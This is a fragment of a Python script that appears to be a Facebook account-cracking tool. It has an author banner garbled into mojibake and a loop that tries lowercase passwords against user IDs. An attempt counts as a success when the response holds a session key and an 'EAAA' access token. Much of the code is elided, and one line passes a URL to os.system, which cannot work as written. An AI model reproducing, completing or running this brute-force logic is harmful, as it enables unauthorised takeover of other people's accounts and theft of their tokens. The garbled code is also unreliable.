...
──────────────────────────────────────────────────────────────────────────────────
    ...
    鈹� [鉁揮 AUTHOR   : nobita             鈹�
    鈹� [鉁揮 GITHUB   : Nobita10           鈹�
    鈹� [鉁揮 WHATSAPP : 01314412828        鈹�
    鈹� [鉁揮 POWER BY : \x1b[1;32mnobita\x1b[1;97m            鈹�
    鈹斺攢鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹榎033[1;92m""")
		...
		if hoga in ["", " "]:
			...
			os.system('https://www.facebook.com/profile.php?id=100066093184226')
		else:
			Main()
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[0;93m[nobita 馃う鈥嶁檪锔廬 : \033[0;97m %s/%s -> \033[0;92m [OK馃槏:%s ]- \033[0;93m[CP馃樋:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[nobita-OK馃槏] %s|%s\033[0;97m         "%(uid, pw))
